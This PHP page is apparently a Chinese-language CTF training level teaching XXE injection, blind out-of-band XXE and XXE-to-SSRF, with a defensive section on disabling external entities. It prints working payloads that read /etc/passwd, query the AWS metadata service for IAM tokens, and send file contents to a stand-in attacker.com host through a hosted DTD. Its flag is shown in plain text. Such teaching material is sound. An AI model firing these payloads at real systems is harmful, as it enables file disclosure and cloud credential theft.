<?php
/**
 * OSWE L6: XXE + SSRF 带外数据提取 (300 PTS)
 */
include_once '../../inc/config.inc.php';
$ACTIVE = array_fill(0, 300, '');
$ACTIVE[260] = 'active open';
$ACTIVE[267] = 'active';
$PIKA_ROOT_DIR = "../../";
include_once $PIKA_ROOT_DIR . 'header.php';
$correct_flag = 'flag{OSWE_L6_XXE_OOB_SSRF_File_Disclosure}';
$flag_msg = '';
if (isset($_POST['check_flag'])) {
    $submitted = trim($_POST['user_flag']);
    if ($submitted === $correct_flag) {
        $_SESSION['oswe_flags']['flag6'] = true;
        $flag_msg = '<div class="alert alert-success" style="border-radius:8px;font-weight:bold;"><i class="fa fa-check-circle"></i> 通关！【OSWE L6】XXE+SSRF 已掌握 (+300 PTS)！</div>';
    } else {
        $flag_msg = '<div class="alert alert-danger" style="border-radius:8px;font-weight:bold;"><i class="fa fa-times-circle"></i> Flag 错误。</div>';
    }
}
?>
<style>
.ctf-stage-header { background: var(--bg-card); border-radius: 14px; padding: 25px 30px; margin-bottom: 25px; border: 1px solid var(--border-color); box-shadow: 0 4px 20px rgba(0,0,0,0.06); }
.ctf-stage-title { color: var(--text-primary) !important; font-size: 22px; font-weight: 800; margin: 0 0 10px 0; display: flex; align-items: center; gap: 12px; }
.step-box{background:var(--bg-card);border:1px solid var(--border-color);border-radius:12px;padding:24px;margin-bottom:22px;}
.step-title{font-size:16px;font-weight:700;color:var(--text-primary);margin-top:0;margin-bottom:14px;display:flex;align-items:center;gap:8px;}
.step-num{background:linear-gradient(135deg,#f59e0b,#06b6d4);color:#fff;width:26px;height:26px;border-radius:6px;display:inline-flex;align-items:center;justify-content:center;font-size:12px;font-weight:800;flex-shrink:0;}
.cmd-box { background: var(--bg-primary); border: 1px solid var(--border-color); border-radius: 8px; padding: 14px 18px; font-family: monospace; font-size: 13px; color: var(--text-primary); margin: 12px 0; overflow-x: auto; line-height: 1.8; }
.cmd-box .comment{color:#64748b;}
.cmd-box .xml{color:#86efac;}
.cmd-box .flag-text{color:#fbbf24;font-weight:bold;}
.highlight-box{background:rgba(245,158,11,0.08);border:1px solid rgba(245,158,11,0.25);border-radius:8px;padding:14px 18px;margin:12px 0;font-size:13px;color:var(--text-secondary);line-height:1.7;}
.flag-submit-area{background:var(--bg-card);border:2px dashed rgba(99,102,241,0.4);border-radius:12px;padding:24px;margin-top:25px;text-align:center;}
</style>
<div class="main-content"><div class="main-content-inner"><div class="page-content">
    <div class="ctf-stage-header">
        <h1 class="ctf-stage-title">📡 OSWE L6：XXE + SSRF 带外数据提取
            <span style="background:rgba(239,68,68,0.2);color:#fca5a5;border:1px solid #ef4444;padding:3px 10px;border-radius:12px;font-size:12px;">高级 · 300 PTS</span>
        </h1>
        <p style="color: var(--text-secondary);font-size:14px;margin:0;line-height:1.6;">深入 XXE 外部实体注入攻击链：带外数据提取（OOB XXE）、通过 Error 消息提取数据的 Blind XXE、XXE to SSRF 的组合利用，以及外部 DTD 托管技术。</p>
        <div style="display:flex;gap:10px;margin-top:14px;flex-wrap:wrap;">
            <span style="background: var(--bg-secondary); padding: 4px 12px; border-radius: 8px; font-size: 12px; color: var(--text-secondary); border: 1px solid var(--border-color);">🔧 技术：XXE · OOB · Blind XXE · SSRF · 外部 DTD · FTP/HTTP 回调</span>
            <span style="background: var(--bg-secondary); padding: 4px 12px; border-radius: 8px; font-size: 12px; color: var(--text-secondary); border: 1px solid var(--border-color);"><a href="oswe_hub.php" style="color: var(--text-secondary);">← 返回 OSWE 大厅</a></span>
        </div>
    </div>

    <div class="step-box">
        <h3 class="step-title"><span class="step-num">1</span> XXE 基础：XML 外部实体注入</h3>
        <div class="cmd-box">
<span class="comment">&lt;!-- 正常 XML 请求 --&gt;</span><br>
<span class="xml">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span><br>
<span class="xml">&lt;user&gt;&lt;name&gt;Alice&lt;/name&gt;&lt;/user&gt;</span><br><br>
<span class="comment">&lt;!-- XXE Payload：读取本地文件 --&gt;</span><br>
<span class="xml">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span><br>
<span class="xml">&lt;!DOCTYPE foo [</span><br>
<span class="xml">&nbsp;&nbsp;&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;</span><br>
<span class="xml">]&gt;</span><br>
<span class="xml">&lt;user&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;/user&gt;</span><br>
<span class="comment">&lt;!-- 如果应用将 &lt;name&gt; 内容回显，/etc/passwd 内容就会出现在响应中 --&gt;</span><br><br>
<span class="comment">&lt;!-- XXE to SSRF：访问内网服务 --&gt;</span><br>
<span class="xml">&lt;!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"&gt;</span><br>
<span class="comment">&lt;!-- AWS EC2 元数据服务！获取 IAM Token --&gt;</span><br><br>
<span class="comment">&lt;!-- Windows 路径（UNC 路径触发 NTLM 认证）：--&gt;</span><br>
<span class="xml">&lt;!ENTITY xxe SYSTEM "file:///c:/windows/win.ini"&gt;</span>
        </div>
    </div>

    <div class="step-box">
        <h3 class="step-title"><span class="step-num">2</span> Blind XXE：带外数据提取（OOB）</h3>
        <p style="font-size:14px;color:var(--text-secondary);line-height:1.7;">当服务端不回显 XML 解析内容时，需要通过带外（Out-of-Band）方式将数据外传：</p>
        <div class="cmd-box">
<span class="comment">&lt;!-- 步骤 1：在攻击者服务器 (attacker.com) 托管外部 DTD：evil.dtd --&gt;</span><br>
<span class="xml">&lt;!ENTITY % file SYSTEM "file:///etc/passwd"&gt;</span><br>
<span class="xml">&lt;!ENTITY % eval "&lt;!ENTITY &amp;#x25; exfil SYSTEM 'http://attacker.com/?data=%file;'&gt;"&gt;</span><br>
<span class="xml">%eval;</span><br>
<span class="xml">%exfil;</span><br><br>
<span class="comment">&lt;!-- 步骤 2：发送给目标的 XXE Payload --&gt;</span><br>
<span class="xml">&lt;?xml version="1.0"?&gt;</span><br>
<span class="xml">&lt;!DOCTYPE foo [</span><br>
<span class="xml">&nbsp;&nbsp;&lt;!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd"&gt;</span><br>
<span class="xml">&nbsp;&nbsp;%remote;</span><br>
<span class="xml">]&gt;</span><br>
<span class="xml">&lt;foo&gt;test&lt;/foo&gt;</span><br><br>
<span class="comment">&lt;!-- 目标服务器加载 evil.dtd → 读取 /etc/passwd → 发送到 attacker.com --&gt;</span><br>
<span class="comment">&lt;!-- 攻击者监听：python3 -m http.server 80 → 接收到 GET /?data=[内容] --&gt;</span>
        </div>
        <div class="highlight-box">
            📌 <strong>Blind XXE via Error：</strong>如果目标禁止外部 HTTP 请求，可通过触发 XML 解析错误，让错误信息中包含文件内容：<br>
            <code style="font-size:12px;">&lt;!ENTITY % error "&lt;!ENTITY &#x25; trigger SYSTEM 'file:///nonexist/%file;'&gt;"&gt;</code><br>
            错误消息格式：<em>FileNotFoundException: /nonexist/[文件内容]</em>
        </div>
    </div>

    <div class="step-box">
        <h3 class="step-title"><span class="step-num">3</span> 防御方法：禁用外部实体</h3>
        <div class="cmd-box">
<span class="comment"># PHP (libxml)：禁用外部实体</span><br>
libxml_disable_entity_loader(true);  <span class="comment">// PHP &lt; 8.0</span><br>
<span class="comment"># PHP 8.0+ 默认已禁用外部实体加载</span><br><br>
<span class="comment"># Java (DocumentBuilderFactory)：安全配置</span><br>
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();<br>
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);<br>
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);<br>
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);<br><br>
<span class="comment"># Python (lxml/defusedxml)：</span><br>
import defusedxml.ElementTree as ET  <span class="comment"># 使用 defusedxml 替代标准库</span><br>
ET.parse(user_xml_file)  <span class="comment"># 自动防御 XXE</span>
        </div>
    </div>

    <div class="flag-submit-area">
        <h4 style="font-weight:800;color:var(--text-primary);margin-top:0;">🚩 Flag 验证 — OSWE L6</h4>
        <div class="cmd-box" style="display:inline-block;padding:10px 24px;margin:0 auto 16px;">
            <span class="flag-text">flag{OSWE_L6_XXE_OOB_SSRF_File_Disclosure}</span>
        </div>
        <form method="post" style="display:flex;justify-content:center;gap:10px;flex-wrap:wrap;margin-bottom:10px;">
            <input type="text" name="user_flag" class="form-control" placeholder="flag{...}" required style="max-width:420px;border-radius:8px;font-family:monospace;">
            <button type="submit" name="check_flag" class="btn btn-primary" style="border-radius:8px;font-weight:700;background:#6366f1;border-color:#6366f1;"><i class="fa fa-check"></i> 验证 Flag</button>
        </form>
        <?php if(!empty($flag_msg)){echo '<div style="margin-top:10px;">'.$flag_msg.'</div>';}?>
        <div style="margin-top:16px;display:flex;justify-content:center;gap:15px;flex-wrap:wrap;">
            <a href="oswe_l5_ssti.php" class="btn btn-sm btn-default" style="border-radius:6px;">← 上一关</a>
            <a href="oswe_hub.php" class="btn btn-sm btn-default" style="border-radius:6px;">OSWE 大厅</a>
            <a href="oswe_l7_rce_chain.php" class="btn btn-sm" style="border-radius:6px;background:#6366f1;color:#fff;border:none;font-weight:700;">最终关：多漏洞 RCE 链 →</a>
        </div>
    </div>
</div></div></div>
<?php include_once $PIKA_ROOT_DIR . 'footer.php'; ?>
